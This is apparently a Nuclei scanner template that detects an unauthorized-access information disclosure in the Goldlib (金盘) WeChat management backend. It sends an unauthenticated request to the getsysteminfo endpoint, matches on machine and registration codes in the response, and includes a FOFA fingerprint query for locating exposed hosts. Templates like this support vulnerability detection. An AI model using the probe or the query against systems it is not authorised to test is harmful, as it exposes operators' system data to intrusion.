id: goldlib-wechat-disclosure

info:
  name: Goldlib Wechat - disclosure
  author: leadlife
  severity: high
  reference:
    - https://peiqi.wgpsec.org/wiki/webapp/%E9%87%91%E7%9B%98/%E9%87%91%E7%9B%98%20%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20getsysteminfo%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html
  metadata:
    verified: true
    fofa-query: title="微信管理后台" && icon_hash="116323821"
  tags: exposure,files,goldlib

http:
  - raw:
      - |
        GET /admin/weichatcfg/getsysteminfo HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "machinecode"
          - "regcode"
          - "unitname"
        condition: and

      - type: status
        status:
          - 200